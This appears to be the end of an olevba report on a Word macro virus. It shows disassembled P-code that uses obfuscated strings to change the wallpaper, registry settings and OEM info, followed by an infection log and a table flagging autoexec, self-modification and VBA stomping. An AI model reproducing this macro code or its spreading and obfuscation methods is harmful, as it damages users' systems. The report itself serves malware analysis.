' 	LitStr 0x0006 "alert "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x002A "I Said : Don`t Press Me ! Can`t You Read ?"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</script>"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #100:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #101:
' 	Ld System 
' 	MemLd Version 
' 	LitR8 0x6666 0x6666 0x6666 0x4010 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #103:
' 	LitStr 0x001F "Hi ! «(¤¿¤)» Have a Nice Day..."
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0007 "InfoTip"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #104:
' 	ElseBlock 
' Line #105:
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St myoem 
' Line #108:
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St myini$ 
' Line #109:
' 	Ld myoem 
' 	Ld myini$ 
' 	Concat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #110:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "[general]"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Manufacturer=FS080298 CORP. 98"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Model=Son, I Love You So Much !"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Support Information]"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Line1=THank`s For Looking My Wallpaper (Win98x Only)"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Line2=My Program Is Not DANGER !"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Line3=Don`t Worry !!!"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Line4="
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Line5=Do You Have Any Comments ?"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Line6=Please Send Your Email to : fs080298@yeayea.com"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Line7=:-)"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #123:
' 	Return 
' Line #124:
' 	Label Finish 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x002C "THank's 4 Looking My Wallpaper (Win98x Only)"
' Line #128:
' 	QuoteRem 0x0000 0x000B "Log File ->"
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0037 " 07:03:2007:03:20 <(¤¿¤)> <(¤¿¤)>-Thursday, 16 Dec 1999"
' Line #131:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #132:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x0031 " 09:22:539:22:53 Sore Sore-Wednesday, 22 Dec 1999"
' Line #138:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #139:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x0025 " 08:26:528:26:52 -Minggu, 26 Des 1999"
' Line #145:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #146:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x002A " 08:12:458:12:45 PM PM-Monday, 27 Dec 1999"
' Line #152:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #153:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x002A " 02:28:132:28:13 PM PM-Tuesday, 4 Jan 2000"
' Line #159:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #160:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x002C " 04:56:84:56:08 PM PM-Wednesday, 26 Jan 2000"
' Line #166:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #167:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x002B " 04:26:94:26:09 PM PM-Saturday, 29 Jan 2000"
' Line #173:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #174:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x002B " 10:09:2310:09:23 AM AM-Monday, 31 Jan 2000"
' Line #180:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #181:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x002A " 09:33:149:33:14 AM AM-Tuesday, 1 Feb 2000"
' Line #187:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #188:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x002B " 01:41:11:41:01 PM PM-Thursday, 24 Feb 2000"
' Line #194:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #195:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0029 " 03:56:33:56:03 PM PM-Friday, 25 Feb 2000"
' Line #201:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #202:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x002C " 10:54:5910:54:59 AM AM-Tuesday, 29 Feb 2000"
' Line #208:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #209:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x002B " 06:36:466:36:46 PM PM-Tuesday, 29 Feb 2000"
' Line #215:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #216:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x0029 " 11:42:3623:42:36 -Donnerstag, 1 Jun 2000"
' Line #222:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #223:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #224:
' Line #225:
' Line #226:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

